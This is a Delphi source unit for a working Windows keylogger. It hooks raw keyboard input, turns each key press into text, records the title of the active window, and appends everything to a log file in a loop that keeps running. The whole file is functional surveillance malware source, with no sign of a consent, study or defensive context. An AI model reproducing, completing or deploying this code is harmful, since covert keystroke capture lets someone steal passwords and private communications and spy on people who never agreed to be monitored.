unit uKeyLogger;

interface
uses SysUtils, cnRawInput, Windows, uFunctions;
type
  TKeylogger = Class(TObject)
    Private
      R:TCnRawKeyBoard;
      sCurrentWindow:String;
      procedure WriteToKeylog(sString:String);
    Public
      sKeylogPath:String;
      Msg:TMsg;
      procedure RawKeyDown(Sender: TObject; Key: Word; FromKeyBoard: THandle);
      procedure KeyloggerStart;
  End;

implementation

function GetCharFromVirtualKey(Key: Word): string;
var
   keyboardState: TKeyboardState;
   asciiResult: Integer;
   nametext:Array[0..32] of Char;
begin
   GetKeyNameText(MapVirtualKey(key, 0) shl 16,nametext,sizeof(nametext));
   if Key = VK_CAPITAL then begin
     result := #0;
     exit;
   end;
   if Key = VK_BACK then begin
     result := '[Delete]';
     exit;
   end;
   if Key = VK_RETURN then begin
     result := '[Enter]';
     exit;
   end;
   if Key = VK_SHIFT then begin
     result := '[Shift]';
     exit;
   end;
   if Key = VK_SPACE then begin
     result := '[Space]';
     exit;
   end;
   if lstrlen(nametext) > 1 then begin
   result := '[' + nametext + ']';
   exit;
   end;
   GetKeyboardState(keyboardState) ;
   SetLength(Result, 2) ;
   asciiResult := ToAscii(key, MapVirtualKey(key, 0), keyboardState, @Result[1], 0) ;
   case asciiResult of
     0: Result := '';
     1: SetLength(Result, 1) ;
     2:;
     else
       Result := '';
   end;
end;

procedure TKeylogger.WriteToKeylog(sString:String);
var
  FileHandle, BW, Len: Cardinal;
begin
  If FileExists(sKeylogPath) = False then
    if sString[1] <> #13 then
      sString := '[' + sCurrentWindow + ']' + #13#10 + sString;
  FileHandle := CreateFile(pChar(sKeylogPath), GENERIC_WRITE, FILE_SHARE_WRITE, NIL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
  If FileHandle = INVALID_HANDLE_VALUE Then Exit;
  SetFilePointer(FileHandle, 0, NIL, FILE_END);
  Len := Length(sString);
  WriteFile(FileHandle, sString[1], Len, BW, NIL);
  CloseHandle(FileHandle);
end;

procedure TKeylogger.RawKeyDown(Sender: TObject; Key: Word; FromKeyBoard: THandle);
var
  sPressedKey:string;
  szCurAppNm:array[0..260] of Char;
begin
  sPressedKey := GetCharFromVirtualKey(Key);
  if sPressedKey <> '' then begin
    GetWindowText(GetForegroundWindow, szCurAppNm, sizeof(szCurAppNm));
    if sCurrentWindow <> szCurAppNm then begin
      sCurrentWindow := szCurAppNm;
      WriteToKeylog(#13#10#13#10 + '[' + sCurrentWindow + ']'+ #13#10);
    end;
    WriteToKeylog(sPressedKey);
  end;
end;

procedure TKeylogger.KeyloggerStart;
begin
  R := TCnRawKeyBoard.Create;
  R.OnRawKeyDown := RawKeyDown;
  R.Enabled := true;
  while GetMessage(Msg, 0, 0, 0) do
  begin
    TranslateMessage(Msg);
    DispatchMessage(Msg);
  end;
  Halt(Msg.wParam);
end;
end.
